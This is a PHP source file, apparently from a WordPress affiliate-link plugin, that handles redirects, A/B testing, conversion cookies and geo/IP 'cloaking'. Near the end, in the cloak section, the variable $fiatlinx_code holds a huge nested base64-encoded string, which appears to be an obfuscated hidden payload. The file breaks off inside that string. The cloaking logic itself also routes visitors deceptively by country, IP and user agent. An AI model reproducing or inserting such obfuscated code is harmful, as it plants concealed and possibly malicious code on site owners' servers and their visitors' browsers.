<?php
global $wpdb, $anderson_makiyama, $post;

date_default_timezone_set("America/Sao_Paulo");

$table_links = $wpdb->prefix . self::CLASS_NAME . "_links";
$table_acessos = $wpdb->prefix . self::CLASS_NAME . "_acess";
$table_configs = $wpdb->prefix . self::CLASS_NAME . "_configs";
$table_metricas = $wpdb->prefix . self::CLASS_NAME . "_metric";


$today = date("Y-m-d H:i:s");
$today_so_data = date("Y-m-d");
$today_no_seconds = date("Y-m-d H:i");
$dois_dias_atras =  self::make_data($today_so_data, 0,0,-2);

$hotlinks_cookie_conversoes = 'hotlinkscookieconversion';

$last_ab_array = array("1" => "a", "2"=>"b", "3"=>"c");

$google_parametros = array("campaignid","adgroupid","feeditemid","targetid","loc_interest_ms","loc_physical_ms","matchtype","network","device","devicemodel","ifmobile","ifnotmobile","ifsearch","ifcontent","creative","keyword","placement","target","param1","param2","random","adposition");

//Salva Conversões na tabela metricas
if(isset($_REQUEST["hotlinksconversion"]) && !empty($_REQUEST["hotlinksconversion"])){
	
	$id_do_link_do_cookie = (int)$_REQUEST["hotlinksconversion"];
	if($id_do_link_do_cookie <1){echo "Id do link do cookie não identificado"; exit;}
	
	$hotlinks_cookie_conversoes .= $id_do_link_do_cookie;
	
	$dados_do_cookie_conversion = trim($_COOKIE[$hotlinks_cookie_conversoes]);
	
	//var_dump( $dados_do_cookie_conversion);exit;

	if(strpos($dados_do_cookie_conversion,"|") !== false){//Existe os valores no cookie
	
		$dados_do_cookie_conversion = explode("|",$dados_do_cookie_conversion);
		
		$cookie_id_link = (int)$dados_do_cookie_conversion[0];
		
		$cookie_teste_ab = $dados_do_cookie_conversion[1];
		
		$array_testes_ab = array("a","b","c");
		
		//var_dump( $dados_do_cookie_conversion);exit;
				
		if($cookie_id_link > 0 && in_array($cookie_teste_ab,$array_testes_ab)){//Tem um ID de Link e um valor de Teste A/B no Cookie, então prossegue
	
			
			//Verifica se existe o link por ID do Cookie
			$cookie_conversion = $wpdb->get_row( $wpdb->prepare( 
				"
					SELECT * FROM $table_links
					where id_link = %d
				", 
				$cookie_id_link
			), ARRAY_A );
		
			switch($cookie_teste_ab){
				
				case "a":
					$sql_conversao = "UPDATE $table_metricas SET conversao_a=conversao_a +1";
				break;
				case "b":
					$sql_conversao = "UPDATE $table_metricas SET conversao_b=conversao_b +1"; 
				break;
				case "c":
					$sql_conversao = "UPDATE $table_metricas SET conversao_c=conversao_c +1";  
				break;	
			}
			
								
			if($cookie_conversion){//O Cookie tinha um ID de Link válido, incrementa conversão
			
					$sql_conversao .= " WHERE id_link = %d";
					$wpdb->query( $wpdb->prepare(
						$sql_conversao
					,$cookie_id_link)  );
					
					setcookie($hotlinks_cookie_conversoes, "", time()-3600,"/");//Apaga Cookie
					exit;
			}
			
	
		}
	
	}else{
		exit;//Não tinha Cookie, mas dá exit, pois foi passado parametros de cookie conversion no url;	
	}
}
//---------------

//Pega dados da tabela Configs
$configs = $wpdb->get_row(  
"
	SELECT * FROM $table_configs
", ARRAY_A );
//----------------------------

$tipo_home = $configs["tipo_home"];


//Verifica se é para Atualizar Tabela Acessos, se for necessário, Atualiza---------------------------------
$options = get_option(self::CLASS_NAME . "_options");

$last_update = isset($options["last_update_acessos"])?$options["last_update_acessos"]:"";

if($last_update < $dois_dias_atras || empty($last_update)){//Precisa Atualizar tabela Acessos
	
	$options["last_update_acessos"] = $today_so_data;
	
	update_option(self::CLASS_NAME . "_options",$options);
	
	if($configs["limite_acessos"] != 10){//Não é Ilimitado, então precisa mesmo Verificar e Limitar
		
		$limit_for_mysql = 10000;
		
		switch($configs["limite_acessos"]){
			
			case "1";
				$limit_for_mysql = 1000; 
			break;
			case "100";
				$limit_for_mysql = 100000; 
			break;	
			case "300";
				$limit_for_mysql = 300000; 
			break;
			case "500";
				$limit_for_mysql = 500000; 
			break;
		}
		
		$configs = $wpdb->get_row(  
		"
			SELECT max(id_acesso) as ultimo_id FROM $table_acessos
		", ARRAY_A );
	
		if($configs){//Existem entradas no db
			
			if($configs["ultimo_id"] > $limit_for_mysql){//De Fato Precisa Excluir Acessos 
				
				$deletar_a_partir_desse_registro = $configs["ultimo_id"] - ($limit_for_mysql/2);//pra não ficar toda hora atualizando, reduz pela metade

				$wpdb->query( $wpdb->prepare( 
					"
					DELETE from $table_acessos
					WHERE id_acesso <= %d
					", 
					$deletar_a_partir_desse_registro
				) );			

				 //Reinicia Contagem trocando os Ids
				$wpdb->query( "ALTER TABLE $table_acessos DROP id_acesso;");
				$wpdb->query( "ALTER TABLE $table_acessos ADD id_acesso BIGINT(20) NOT NULL AUTO_INCREMENT FIRST, ADD PRIMARY KEY (id_acesso);" );
				
					//$wpdb->show_errors(); 
					//$wpdb->print_error();
					
				
				
			}
			
		}
		
	}
	
}
//--------------------------------------------------------------------------------------------------------------------------------

$current_url = $_SERVER['REQUEST_URI'];


if(strpos($_SERVER['REQUEST_URI'],"?") !== false){

	if(empty($_SERVER['QUERY_STRING'])){
		
		 $_SERVER['QUERY_STRING'] = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'],'?')+1);
	}
	
	$current_url = str_replace("?". $_SERVER['QUERY_STRING'],"",$_SERVER['REQUEST_URI']);
	
}


$parts = explode('/', $current_url);
$last = end($parts);


if(empty($last)){
	
	$request_url = substr($current_url,1,strlen($current_url)-2);

	$parts = explode('/', $request_url);
	$last = end($parts);

}


//Verifica se é para pegar Histórico de outro Link
$hid = isset($_GET["hotid"])?(int)$_GET["hotid"]:0;
//-------


parse_str(html_entity_decode($_SERVER['QUERY_STRING']), $query_string_array);


$src = isset($_GET["src"])?$_GET["src"]:"";
$utm_source = isset($_GET["utm_source"])?$_GET["utm_source"]:"";

$query_string_final = $_SERVER['QUERY_STRING'];

$nome_do_parametro = "";

if(isset($query_string_array["src"])){

	$nome_do_parametro = "src";
	
}elseif(isset($query_string_array["utm_source"])){
	
	$nome_do_parametro = "utm_source";
	
}
	
$referrer = isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'Acesso Direto, sem Referência';

//Pega o Dispositivo
$detect = new Mobile_Detect_Hot_Links_Plus();
$dispositivo = ($detect->isMobile() ? ($detect->isTablet() ? 'TAB' : 'CEL') : 'PC');
//----

//Pega IP do Visitante
$ip = $_SERVER['REMOTE_ADDR'];
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];

if(filter_var($client, FILTER_VALIDATE_IP))
{
	$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
	$ip = $forward;
}
//----

$link_completo = $_SERVER['REQUEST_URI'];//para guardar no relatório



//Não trata-se de um link, não faz nada
if(empty($last) && $tipo_home <=0){

	if(0>=$hid) return;//Não é uma página ou post com HotID no url, então retorna

	//Verifica se existe o Link com o Hot ID
	$link = $wpdb->get_row( $wpdb->prepare( 
		"
			SELECT * FROM $table_links
			where id_link = %d
		", 
		$hid
	), ARRAY_A );
	
	if(!$link) return;//Link com Hotid especificado não encontrado
		
	$o_dispositivo_param = $link["passar_dispositivo"] ==0?"|".$dispositivo:'';
		
	$hotlinks_cookie = "hotlinks_" . $hid;
	
	if(!empty($nome_do_parametro)){//Existe src ou utm_source para gravar no cookie

		$dados_do_cookie = trim($_COOKIE[$hotlinks_cookie]);

		//verifica numero de infos das origens, se forem muitas, reduz
		$conta_parametros = explode("|",$dados_do_cookie);
		$total_parametros = count($conta_parametros);
		
		if($total_parametros > 50){
			$conta_parametros = array_slice($conta_parametros,0,50);
			$conta_parametros = implode("|",$conta_parametros);
			$dados_do_cookie = $conta_parametros;
		}
		//----
		
		if(!empty($dados_do_cookie)) $dados_do_cookie = "|" . $dados_do_cookie;	
			
		setcookie($hotlinks_cookie,$query_string_array[$nome_do_parametro].$o_dispositivo_param.$dados_do_cookie,time()+60*60*24*30*6,"/");
		
		$tipo_de_link = "Post/Page";
		
		$nome_link = "(". $tipo_de_link . ") HotID: " . $hid; 
		
		$url_final =  'http'.(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on' ? 's':'').'://' . $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];//get_permalink($post);
			
		self::cadastra_views($hid,$nome_link,$link_completo,$dispositivo,$url_final,$referrer,$ip,"",$configs["ativar_webservices"]);
	}
	
	return;//Como não é um Link, precisa retornar aqui, aqui ele só atualizou o Cookie para as Páginas e Posts 
}


$last = strtolower($last);

$keyword = $last;

//$options = get_option(self::CLASS_NAME . "_options");


if($tipo_home >0 && empty($last)){//É Home do Site
	//Verifica se existe o link por ID
	
	if($tipo_home==1){//Abrir como um Link pelo ID
	
		$url_link = (int)$configs["url_home"];
		
		if($hid >0) $url_link = $hid; 
		
		$link = $wpdb->get_row( $wpdb->prepare( 
			"
				SELECT * FROM $table_links
				where id_link = %s
			", 
			$url_link
		), ARRAY_A );
		
		if($link) $link["nome_link"] = "(Home)" . $link["nome_link"];
	
	}else{//Redirecionar
		
		$url_link = $configs["url_home"];
		if(!empty($url_link)){
			header("Location: $url_link");exit;
		}
	}
	
}else{
	//Verifica se existe o link por slug
	$link = $wpdb->get_row( $wpdb->prepare( 
		"
			SELECT * FROM $table_links
			where palavra_chave = %s
		", 
		$keyword
	), ARRAY_A );
}


//Não é Link Criado no HotLinks, não faz Nada
if(!$link){
	
	if(0>=$hid) return;//Não é uma página ou post com HotID no url, então retorna

	//Verifica se existe o Link com o Hot ID
	$link = $wpdb->get_row( $wpdb->prepare( 
		"
			SELECT * FROM $table_links
			where id_link = %d
		", 
		$hid
	), ARRAY_A );
	
	if(!$link) return;//Link com Hotid especificado não encontrado
		
	$o_dispositivo_param = $link["passar_dispositivo"] ==0?"|".$dispositivo:'';
	
	$hotlinks_cookie = "hotlinks_" . $hid;
	
	if(!empty($nome_do_parametro)){//Existe src ou utm_source para gravar no cookie

		$dados_do_cookie = trim($_COOKIE[$hotlinks_cookie]);
		//verifica numero de infos das origens, se forem muitas, reduz
		$conta_parametros = explode("|",$dados_do_cookie);
		$total_parametros = count($conta_parametros);
		
		if($total_parametros > 50){
			$conta_parametros = array_slice($conta_parametros,0,50);
			$conta_parametros = implode("|",$conta_parametros);
			$dados_do_cookie = $conta_parametros;
		}
		//----
				
		if(!empty($dados_do_cookie)) $dados_do_cookie = "|" . $dados_do_cookie;
	
		setcookie($hotlinks_cookie,$query_string_array[$nome_do_parametro].$o_dispositivo_param.$dados_do_cookie,time()+60*60*24*30*6,"/");

		$tipo_de_link = "Post/Page";
		
		$nome_link = "(". $tipo_de_link . ") HotID: " . $hid; 
		
		$url_final =  'http'.(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']=='on' ? 's':'').'://' . $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];//get_permalink($post);
				
		self::cadastra_views($hid,$nome_link,$link_completo,$dispositivo,$url_final,$referrer,$ip,"",$configs["ativar_webservices"]);

	}
	
	return;//Como não é um Link, precisa retornar aqui, aqui ele só atualizou o Cookie para as Páginas e Posts 	

}

//Aqui já indica que o Link Foi encontrado

$o_dispositivo_param = $link["passar_dispositivo"] ==0?"|".$dispositivo:'';
$total_acessos = $link["total_acessos"];
$total_acessos++;

$total_acessos_unicos = $link["total_acessos_unicos"];


//Verifica se é Acesso Único
$acesso = $wpdb->get_row( $wpdb->prepare( 
	"
		SELECT dt_acesso FROM $table_acessos
		WHERE id_link = %s
		AND ip_acesso = %s
		ORDER BY dt_acesso DESC LIMIT 1
	", 
	$link["id_link"], $ip
), ARRAY_A );

if($acesso){//

	$hoje = date('Y-m-d');
	
	$hoje_ini = $hoje . " 00:00:00";
	
	if($acesso["dt_acesso"] <=$hoje_ini ){//Acesso foi antes de Hoje, é único
		$total_acessos_unicos++;
	}

}else{
	$total_acessos_unicos++;
}

//---------------------------

$url_final_cloak = '';

//Verifica se é para fazer Teste A/B
$url_afiliado2 = trim($link["url_afiliado2"]);
$url_afiliado3 = trim($link["url_afiliado3"]);
$url_afiliado_final = trim($link["url_afiliado"]);
$last_ab = $link["last_teste_ab"];

$url_back_redir_final = trim($link['url_back_redir']);

$sql_metric = '';//Se na seção do Cloak sql_metric estiver vazia, significa que não precisa atualizar metricas;


if(!empty($url_afiliado2)){//Teste A/B Ativado
	
	$current_mob_page = isset($_GET["mob"])?strtolower($_GET["mob"]):"";
	$current_mob_page = $current_mob_page=="a" || $current_mob_page =="b"?$current_mob_page:"";
	
	$mob_array = array();
	$mob_array[] = '';
	$mob_array[] = 'a';
	$mob_array[] = 'b';
	
	if($link["mob_redir"] !=0) $current_mob_page = $mob_array[$link["mob_redir"]];
	
	if(!empty($current_mob_page)){//Existe o parametro mob e está com valor a ou b
		
		if($current_mob_page == "b" && $dispositivo != 'PC') $url_afiliado_final = $url_afiliado2;//É Mob e Mob precisa abrir pagina B
		
		if($current_mob_page == "a" && $dispositivo == 'PC') $url_afiliado_final = $url_afiliado2;//É Computer e Computer precisa abrir pagina B
		
	}else{

		if($last_ab == 1){//O Atual é o B
			$url_afiliado_final = $url_afiliado2;
			
			$last_ab=2;//Prepare para o Teste C

			
			$sql_metric = "INSERT INTO $table_metricas (id_link, nm_link, acesso_a, acesso_b,acesso_c) VALUES(%d, %s, 0,1,0) ON DUPLICATE KEY UPDATE    
					acesso_b=acesso_b +1";
			
		}elseif($last_ab == 2 && !empty($url_afiliado3)){//O Atual é o C, mas url C não pode estar Vazia
		
			$url_afiliado_final = $url_afiliado3;
			$last_ab=3;
			
			$sql_metric = "INSERT INTO $table_metricas (id_link, nm_link, acesso_a, acesso_b,acesso_c) VALUES(%d, %s, 0,0,1) ON DUPLICATE KEY UPDATE    
					acesso_c=acesso_c +1";
					
		}else{//O Atual é o A
			$last_ab=1;	
			
			$sql_metric = "INSERT INTO $table_metricas (id_link, nm_link, acesso_a, acesso_b,acesso_c) VALUES(%d, %s, 1,0,0) ON DUPLICATE KEY UPDATE    
					acesso_a=acesso_a +1";			
			
		}


		//Desativei o IF abaixo, pois se o cara acessar duas paginas de vendas a e b, precisa contabilizar, e mudar a referencia no cookie
		//if($acesso["dt_acesso"] <=$hoje_ini){//Só atualiza métricas se é acesso único
		
		
			//Se Cloak Estiver Desativado, já guarda as Métricas
			if($link["ativar_cloak"] == 0){
		
				self::cadastra_metricas($sql_metric, $link ,$hotlinks_cookie_conversoes,$last_ab_array[$last_ab]);	
			}
			
		
		//}
	
					
	}
	

	
}else{ //Teste A/B Não está ativo, mas cadastra acesso na tabela Métricas granvando url A no cookie se o Recurso estiver Ativado no Plugin

	if($link["ativar_cloak"] == 0 && $link["ativar_metricas"] ==1){	//Verifica se Cloak está desativado, pq se não, precisa ver se cloak vai abrir a/b ou não e guardar métricas conforme isso.
	
		$sql_metric = "INSERT INTO $table_metricas (id_link, nm_link, acesso_a, acesso_b,acesso_c) VALUES(%d, %s, 1,0,0) ON DUPLICATE KEY UPDATE    
					acesso_a=acesso_a +1";
					
		self::cadastra_metricas($sql_metric, $link ,$hotlinks_cookie_conversoes,'a');
		
	}
}
//----


//Atualiza numero de views
$wpdb->query( $wpdb->prepare( 
	"
		update $table_links
		set total_acessos = %d, total_acessos_unicos = %d, last_teste_ab = %d
		where id_link = %d
	", 
	$total_acessos,
	$total_acessos_unicos, 
	$last_ab,
	$link["id_link"]
) );


$keyword_query = empty($_SERVER['QUERY_STRING'])?$keyword:$keyword . "?" . $_SERVER['QUERY_STRING'];

//Verifica se Há Mudança de Url em um Dado Período, se houver, modifica o url Final
if($link["exibir_periodo"] != 0 && !empty($link["periodo_url"]) && $today_no_seconds >= $link["dedata"] && $today_no_seconds <= $link["atedata"]){
	
	$url_afiliado_final = $link["periodo_url"];
	
	if($link["exibir_periodo"] ==2){
		$link["redirecionamento"]=0;//Modifica para Redir MetaRefresh
	}
	
}
	
//Verifica se é para repassar Query String
if($link["ativar_parametros_url"]==1){ //Sim, ativar

	//
	$hotlinks_cookie = "hotlinks_". ($hid>0?$hid:$link["id_link"]);
	$dados_hotlinks_cookie = "";
	//----
	
	if(!empty($nome_do_parametro)){//Existe src ou utm_source, então segue com o processo
		
		$dados_do_cookie = '';
		
		if($link["ativar_rastreio_cookie"]==1){
			
			if($link["so_ultima_origem"]==1){//Só ultima origem está ativa
			
				//Só pega Dados do Cookie se Não Houver Nova Origem na Url
				if(empty($query_string_array[$nome_do_parametro])) $dados_do_cookie = trim($_COOKIE[$hotlinks_cookie]);
				
			}else{//Pega dados do cookie mesmo com novos parametros no url, vai unir tudo
				$dados_do_cookie = trim($_COOKIE[$hotlinks_cookie]);
			}
		}
		$ttb = '';
		
		if(!empty($url_afiliado2) && $last_ab == 2){
			$ttb = "-ttb"; //Insere -ttb após palavra chave se for teste b
		}elseif(!empty($url_afiliado3) && $last_ab == 3){
			$ttb = "-ttc";
		}
		
		if($configs["param_google"] != 0){ //Pegar e transformar parametros do Google
			
			$google_parametros_prontos = array();
			
			foreach($google_parametros as $google_param){
				
				if($google_param == "keyword" && $configs["param_google"] == 2){//é pra ocultar a keyword
										
					$query_string_array["keyword"] = 'hlp_trackerid';
				}				
				
				if(isset($query_string_array[$google_param])){
					
					 $google_parametros_prontos[]= $google_param ."-".$query_string_array[$google_param];
				
				}
							
				
			}
			
			
			if(count($google_parametros_prontos)>0){//Havia parametros google no url, então monta eles.
				$google_parametros_prontos = implode("|",$google_parametros_prontos);
				$query_string_array[$nome_do_parametro] = empty($query_string_array[$nome_do_parametro])?$google_parametros_prontos:$google_parametros_prontos."|".$query_string_array[$nome_do_parametro];
			}
		}
		
		if(empty($query_string_array[$nome_do_parametro])){
			 $query_string_array[$nome_do_parametro] = empty($dados_do_cookie)?$ttb . $o_dispositivo_param:$dados_do_cookie.$ttb.$o_dispositivo_param;
		}else{
			$query_string_array[$nome_do_parametro] = empty($dados_do_cookie)?$query_string_array[$nome_do_parametro].$ttb.$o_dispositivo_param:$query_string_array[$nome_do_parametro].$ttb.$o_dispositivo_param."|".$dados_do_cookie;
		}
		
		//verifica numero de infos das origens, se forem muitas, reduz
		$conta_parametros = explode("|",$query_string_array[$nome_do_parametro]);
		$total_parametros = count($conta_parametros);
		
		if($total_parametros > 50){
			$conta_parametros = array_slice($conta_parametros,0,50);
			$conta_parametros = implode("|",$conta_parametros);
			$query_string_array[$nome_do_parametro] = $conta_parametros;
		}
		//----		
		
		if($link["ativar_rastreio_cookie"]==1) setcookie($hotlinks_cookie,$query_string_array[$nome_do_parametro],time()+60*60*24*30*6,"/");	
		
		
		//Une parametros do link e da querystring que vieram no url
		if(strpos($url_afiliado_final, "?") !==false){//Existem Parametros, precisa forçar junção
			
			$posicao_interrogacao = strpos($url_afiliado_final,'?');
			
			$url_destino_params = substr($url_afiliado_final, $posicao_interrogacao+1);
			
			$url_destino_clean = substr($url_afiliado_final,0, $posicao_interrogacao);
			
			parse_str(html_entity_decode($url_destino_params), $query_string_array_url_destino);
			
			$params_final_array = self::array_concat( $query_string_array_url_destino, $query_string_array);
			
			if($configs["param_google"] == 3 && isset($params_final_array[$nome_do_parametro])){//Ocultar SRC Inteiro
				
				$params_final_array[$nome_do_parametro] = 'hlp_trackerid';
				$params_final_array = self::get_query_sem_google_params($google_parametros,$params_final_array);
				
			}
			
			$query_string_final = urldecode(http_build_query($params_final_array,'','&'));
			$url_afiliado_final = $url_destino_clean . "?" . $query_string_final;
			
			
		}else{
			
			if($configs["param_google"] == 3 && isset($query_string_array[$nome_do_parametro])){//Ocultar SRC Inteiro
				
				$query_string_array[$nome_do_parametro] = 'hlp_trackerid';
				$query_string_array = self::get_query_sem_google_params($google_parametros,$query_string_array);
				
			}
			
			$query_string_final = urldecode(http_build_query($query_string_array,'','&'));
			$url_afiliado_final .= 	'?' . $query_string_final;
			
		}	
		//
		
		//Une parametros do link do Backredir e da querystring que vieram no url
		if($link['ativar_back_redir'] == 1 && !empty($link['url_back_redir'])){
		
			$url_back_redir = trim($link['url_back_redir']);
			
			$url_back_redir_final = self::get_urls_com_parametros($url_back_redir,$query_string_array,$nome_do_parametro,$configs,$google_parametros);
				
								
		}
		//
		
		//Une parametros do Modo Turbo
		if($link["ativar_turbo"]==1){
		
			$link["turbo_url"] = trim($link["turbo_url"]);
			$link["clique_url"] = trim($link["clique_url"]);
			$link["segundo_url"] = trim($link["segundo_url"]);
			
			if(!empty($link["turbo_url"])) $link["turbo_url"] = self::get_urls_com_parametros($link["turbo_url"],$query_string_array,$nome_do_parametro,$configs,$google_parametros);
			
			if($link["redirect_clique"]==1 && !empty($link["clique_url"])) $link["clique_url"] = self::get_urls_com_parametros($link["clique_url"],$query_string_array,$nome_do_parametro,$configs,$google_parametros);	

			
			if($link["redirect_segundo"]==1 && !empty($link["segundo_url"])) $link["segundo_url"] = self::get_urls_com_parametros($link["segundo_url"],$query_string_array,$nome_do_parametro,$configs,$google_parametros);	
			
								
		}
		//		
		
		
	}
	
		
}


//----


//Verifica as Opções do Cloak
if($link["ativar_cloak"] == 1){//Cloak Ativo
	
	$from_country = array();
	
	if(!empty($link["from_country"])) $from_country[] = $link["from_country"];//Pega País Cadastrado para o Redirect
	if(!empty($link["from_country2"])) $from_country[] = $link["from_country2"];//Pega País 2 Cadastrado para o Redirect
	if(!empty($link["from_country3"])) $from_country[] = $link["from_country3"];//Pega País 3 Cadastrado para o Redirect
	if(!empty($link["from_country4"])) $from_country[] = $link["from_country4"];//Pega País 4 Cadastrado para o Redirect
	
	$url_fora_br = trim($link["url_fora_br"]);
	$url_no_br = trim($link["url_no_br"]);
	
	if($link["ativar_parametros_url"]==1 && !empty($nome_do_parametro)){
		
		switch($configs["acao_block"]){
		
			case "0": //url no br é link afiliado
				if(!empty($url_no_br)){
					$url_no_br = self::get_urls_com_parametros($url_no_br,$query_string_array,$nome_do_parametro,$configs,$google_parametros);	
				}
			break;
			case "1"://url fora do br é link afiliado
				if(!empty($url_fora_br)){
					$url_fora_br = self::get_urls_com_parametros($url_fora_br,$query_string_array,$nome_do_parametro,$configs,$google_parametros);	
				}
			break;	
			
		}
		
	}

	//Pega IPs Bloqueados
	$ips_bloqueados = trim($configs["ips_bloqueados"]);
	
	$ips_bloqueados = explode(",",$ips_bloqueados);
	//--------------------

	//Pega Código do País
	$var_country_code = self::get_country_code($ip,$configs["ativar_webservices"]);
	
	//----
	$bloqueado_txt = "";
	
	
	$user_agent = isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
	$user_agent = strtolower($user_agent);
	
	
	
	//Código Legal Aqui ------------------------------------------------------------------------------------

$fiatlinx_code="JGZpYXRsaW54X2NvZGU9IkpHWnBZWFJzYVc1NFgyTnZaR1U5SWtwSFduQlpXRkp6WVZjMU5GZ3lUblphUjFVNVNXdHdTRmR1UWxwWFJrcDZXVlpqTVU1R1ozbFVibHBoVWpGVk5WTlhkSGRUUm1SMVVXeHdXRkpyY0RaWFZscHFUVlUxUjFvemJGVmliSEJvVldwR1ZrNVdUbGhrU0dSVVVtMVNNVlZYZUhkWFJrcHlZMFJhV0Zac2NIRlVWbFV4VWpGdmVtSkdWbWxpU0VKdlZsZHdSMVpyTlZkVWJHaHJVMGRTVlZacVFYaE9WbXh5VjI1T1YxSnJiRFZXUjNCUFZqRkplbEZyVWxWaE1YQjVXbFphWVdOc1duTlhiV3hYVWxad2FGWnNVa05oTWtaMFZWaG9WbUpIYUhOVmExcExWVVpXYzFWc1pGTmlSbG93V1hwT2IxZEdXbkpPVld4WVZrVTFkbFpzV210VFIxWkdaVVpXVGxadVFubFdSM2hoVkRKU1IxVnVVbXhTYXpWVVdXMTBTMDB4V25GUmJHUnBUV3R3ZVZSVmFHdFVNVnAwWVVoQ1ZrMUhVblpXTW5oV1pERndTR05IZUdsU2EzQlpWbXBLZDFVeFVYaFRiRlpYWVd0S1YxbHNVa2RWUm14eVYydDBWRkpzU2xwWlZWcDNWR3hLVlZack1WZE5ibEpvVlZSR1lWSXhVblZWYlhCVFlsaG9WbFpYY0V0VU1EVlhWMWhzVGxaR1NsQlZiRkpYVWpGU2MyRkdUbGROYTNCYVdWVm9UMVp0U2xWV2JsWlZWbFp3VkZwRlpFOVNiSEJIWTBVMWFWSnVRa2hXYlhCS1pESldSMXBHV2s1V2JYaG9XbGQwUzFac2JITmhSVTVVVW0xU1ZsVXllR3RWTVZwMFpIcEtWbFl6YUhwV2ExcEtaVlpTY1Zkc1pGTk5NbWh2VmtkMFZrMVdTbkpPVm14VFlrVTFjRlpzVWxkbGJGcFlaRWRHYTAxck5WaFhhMVpYVmtkS1NGVnRSbFZXTTJob1ZXMTRZV1JGTVVsaFJtaFhZWHBXU2xZeFVrOWtNVnBYVjFod1lXVnJTbFpaVkVaV1pVWndSbGR0ZEd0U2JFb3dXbFZhVDFVeVNsbFpNMmhYVFZkTmVGbDZSazlqYXpWSldrZHdVMVl6YUhoV1JtTjRUa1prYzFaWVpHRlNNMEp5VkZaYVMyVkdWblJqUms1VlRWVndWbFp0ZEhOV01VbzJVbXhDV21FeGNFeFZha1pQWkZaV2MyRkdUbGROYldkNFZtdGFWMVp0VmtoVVdHeFhZVEZhVjFsWWNITldSbFp6VjI1a2FsWnRVbnBXYlhoUFZtc3hjbGR1Y0ZwV1ZscDZWMVprVjJOc1pISlBWMFpYWWtadmVWWkhlR0ZYYlZaMFUydGFhMUl6UW5CVmFrcHZVekZaZVU1WVpGUk5Wa1kxVlRKNGIxWnNXa1pYYkd4V1lrZFNkbHBHV2xOV1ZrWlZVVzE0VTAxV2NFZFdiR1I2VGxkS1NGTnNiR2hUUlZwWldXdGFZVlpHYkZoTlZrcHNWbXh3ZWxsclpITlViVXBaWVVkR1YySllVbFJWVkVwUFVqSk9SbHBHYUdoaVJYQlJWbGQ0VTFack1YTldXR3hPVmxSc2NGVnRkSGRUUm10M1lVVmtXRkpyY0VkV01WSkRWbGRGZUZaWWFGcE5WbkJ5V2tWYVUyUkhWa2RVYkU1cFlUQnNNMVpxUmxOVGJWWkhVMWhvYUUweWVGaFpWRVpoVjBac2MxVnJaRmhpUmxZelYydGtkMkpHV25OVGJHeGhWbFpLVkZaRVJrdFdWbHBWVTJ4YVRsWXhTalpXYkZaclZqRlplRlJzVmxWaVJrcFlWRlJLYW1ReFdraGtSbHBPVm10d1dGa3dWbTlXVjBwWllVWlNWbUpZVWpOYVZWcGFaREZhZEU5WGJHaGxhMXBKVjFSQ2IxUXlTa2RUYTJSVVlrVktWMWxVUm1GTk1XeFlaVWhrVjJKR1ducFZNakUwVlRKS1JtTkZiRmhpUmxwVVZsUkdVbVZHWkhKWGF6VllVbFZ3YjFkWGRHRmtNRFZ6WWtaa1dHSlViRlZXYlRWQ1RXeGFTR1ZGVGxkTmEzQXdWMVJPYTFZeFNqWldhazVXWld0d1dGVXdXa3RqTWtaSFYyMXNWMVpHV2paV2JHUXdZVEZTY2sxV1pHcFNWbHBVV1ZkNFMxVkdWbk5WYkZwT1lrWnNOVlJXVlRWaFZrcHlZMFZvV2xkSVFrUldhMXBhWld4d1JWUnNWazVXYkhBMlYxaHdTMVl4U2xkV2JrcFFWak5vY0ZWdE1EUmxSbHB4VVd4a2FVMXJjSGxVVm1oUFlVVXdlV0ZJVGxaaE1YQk1WbFZhWVdOV1NuVmFSMmhwVTBWS1dGWnNZM2hTTWtaWFUxaGthVkpHU2xaVVZtUlRWVVpzY2xkcmRGTk5hM0JHVm0xNGQxUnRTbGxoUlhoWFVqTkNSRnBFUms5WFJsSlpZa2RzVTJGNlZsQldha0pyWVcxUmVGZHJhR3RTTTFKV1ZGWmtNRTVXV25Sa1JtUlhZbFZ3VmxWdGVIZFdhekZJVlc1R1lWSkZXbFJXTUdSVFVteHdSMk5GTldsU2JrSklWbTE0YW1WSFVYaGFSbVJWWVRKb1lWUlVTbTlXYkZsM1drUlNWVkpzUmpSV01qRXdWREZhY2s1VVFsZFNla1V3VmxSR1MyUldSblZoUm1ST1VteHdNbGRYTVhwa01sRjNUbFphYVZJelFsUlZiWFIzV1ZaYVZWRnRkR2hpVmxwWVZsYzFVMkpHU2tkVGJFSldZa1pLV0ZwVldtdGpiSEJHVDFkc1UyRXpRa3BXYTFwdllURmtSMU5zYUdoVFJscFdWbXRXUjAweGNGWmFSbVJUVm14YWVWUXhaRFJoUlRGSVQwaHNWMkZyU2xoWmFrcExZMnN4V1ZSdGJGTmlSWEJXVjFkNFlWTXhWbk5YYkZaU1ltMVNiMWxyYUVOV01WcFlUVmhrVldKVmNFbFpWVlozVjBkS2RWRnJlRmRTTTJob1drWmFkMDVzUm5OV2JXeHBZVEJ3VGxacVJsTlRNVmw0VTJ4a1dHSnNTazlXYlRFMFZsWldjVk5yT1U5V2JIQklWbGQwYTFReFNsVldhMlJWWWtkb1ZGWXdaRXRXYXpWWlZHeGFhRTFzU2xCWGJGWmhZVEZLZEZKcmFFOVdWRlp3VlRCV1MxZFdaSE5XYkU1V1RWWkdOVlp0TlU5V1IwWnpWMnhzVm1KSFVuWmFSbHBUVmxaR1ZWWnNaRTVpUm5CSFZteGtlazVXV1hkTlZteFNZbXRhV1ZscldtRldSbGw1VFZaa2FrMXJXa2RaYTJSSFlrZEZlbEZ0T1ZoV00xSjJXVzF6ZUZJeFZuVlZiWEJUWVhwV2QxWlhlR3RPUjFaSFlrUmFWR0ZyU25CVmFrWmhWakZyZDFadVRsaFNhM0JaV1ZWb1YxWldXbGRqU0d4aFZsZFNXRlZzV2xkamF6bFhWR3MxV0ZKVmNEUldha28wVmpGVmVGWnVVbGRpUjFKVVdXdGtVMk14Vm5KWGEzUldVbXhhZUZWV1VrZGhSMHBKVVd4a1YxWXphR2haYTJSR1pWZFdSVkpzVmxkaVZrcE5WbFJKZUZNeFRsZGpSRnBTWWtaYWNGWXdWa3RVVm